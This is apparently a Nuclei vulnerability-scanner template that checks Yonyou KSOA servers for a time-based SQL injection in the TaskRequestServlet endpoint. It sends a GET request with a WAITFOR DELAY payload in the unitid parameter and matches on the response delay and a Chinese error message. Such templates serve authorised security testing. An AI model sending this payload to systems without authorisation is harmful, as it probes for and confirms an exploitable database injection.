id: poc-yaml-yong-you-shi-kong-ksoa-taskrequestservlet-sqli
info:
  name: 用友时空KSOA-TaskRequestServlet-SQL注入
  author: ProjectDiscoveryAI
  severity: critical
  tags: sql-injection
  description: |
    Detects SQL injection vulnerability in 用友时空 KSOA TaskRequestServlet allowing time-based SQL injection.

variables:
  t1: "{{rand_int(5,10)}}"

http:
  - raw:
      - |
        GET /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27--%20 HTTP/1.1
        Host: {{Hostname}}
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "status_code == 200"
          - "!contains(body, '<')"
          - "contains(gbk_decode(body), 'error:连锁单位登录失败：登录单位不存在')"
